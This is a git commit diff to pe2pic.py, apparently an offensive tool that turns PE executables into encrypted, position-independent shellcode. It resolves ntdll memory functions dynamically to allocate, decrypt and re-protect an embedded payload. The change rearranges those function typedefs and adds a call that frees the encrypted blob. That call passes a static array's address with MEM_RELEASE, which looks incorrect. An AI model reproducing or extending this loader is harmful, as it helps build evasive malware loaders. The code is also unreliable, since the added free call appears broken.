3842eb1c40956adf68a8aac031be064e77e507d5
skimask1690 <123434315+skimask1690@users.noreply.github.com>
2026-01-11 00:14:23 -0500

    Cleanup

--- loader/pe2pic.py
+++ loader/pe2pic.py
@@ -77,6 +77,31 @@ if use_encrypt:
     nonce_literal = ", ".join(f"0x{b:02x}" for b in chaskey_nonce)
     c_source = textwrap.dedent(f"""
     #include "pe_loader.h"
+    
+    typedef NTSTATUS (NTAPI *NtAllocateVirtualMemory_t)(
+        HANDLE ProcessHandle,
+        PVOID *BaseAddress,
+        ULONG_PTR ZeroBits,
+        PSIZE_T RegionSize,
+        ULONG AllocationType,
+        ULONG Protect
+    );
+
+    typedef NTSTATUS (NTAPI *NtProtectVirtualMemory_t)(
+        HANDLE ProcessHandle,
+        PVOID *BaseAddress,
+        PSIZE_T RegionSize,
+        ULONG NewProtect,
+        PULONG OldProtect
+    );
+
+    typedef NTSTATUS (NTAPI *NtFreeVirtualMemory_t)(
+        HANDLE ProcessHandle,
+        PVOID *BaseAddress,
+        PSIZE_T RegionSize,
+        ULONG FreeType
+    );
+    
     typedef unsigned long long u64;
     typedef unsigned long u32;
 
@@ -134,31 +159,11 @@ if use_encrypt:
     void _start(void) {{
         HMODULE hNtdll = myLoadLibraryA(ntdll_dll);
 
-        typedef NTSTATUS (NTAPI *NtAllocateVirtualMemory_t)(
-            HANDLE ProcessHandle,
-            PVOID *BaseAddress,
-            ULONG_PTR ZeroBits,
-            PSIZE_T RegionSize,
-            ULONG AllocationType,
-            ULONG Protect
-        );
-
-        typedef NTSTATUS (NTAPI *NtProtectVirtualMemory_t)(
-            HANDLE ProcessHandle,
-            PVOID *BaseAddress,
-            PSIZE_T RegionSize,
-            ULONG NewProtect,
-            PULONG OldProtect
-        );
+        SIZE_T size = sizeof(enc_blob);
+        PVOID pe = NULL;
 
         NtAllocateVirtualMemory_t NtAllocateVirtualMemory =
             (NtAllocateVirtualMemory_t)myGetProcAddress(hNtdll, ntallocatevirtualmemory);
-
-        NtProtectVirtualMemory_t NtProtectVirtualMemory =
-            (NtProtectVirtualMemory_t)myGetProcAddress(hNtdll, ntprotectvirtualmemory);
-
-        SIZE_T size = sizeof(enc_blob);
-        PVOID pe = NULL;
 
         NtAllocateVirtualMemory(
             (HANDLE)-1,
@@ -171,7 +176,24 @@ if use_encrypt:
 
         decrypt_blob((unsigned char*)pe);
 
+        NtFreeVirtualMemory_t NtFreeVirtualMemory =
+            (NtFreeVirtualMemory_t)myGetProcAddress(hNtdll, ntfreevirtualmemory);
+
+        {{
+            SIZE_T freeSize = 0;
+            NtFreeVirtualMemory(
+                (HANDLE)-1,
+                (PVOID*)&enc_blob,
+                &freeSize,
+                MEM_RELEASE
+            );
+        }}
+
         ULONG oldProt;
+        
+        NtProtectVirtualMemory_t NtProtectVirtualMemory =
+            (NtProtectVirtualMemory_t)myGetProcAddress(hNtdll, ntprotectvirtualmemory);
+        
         NtProtectVirtualMemory(
             (HANDLE)-1,
             &pe,
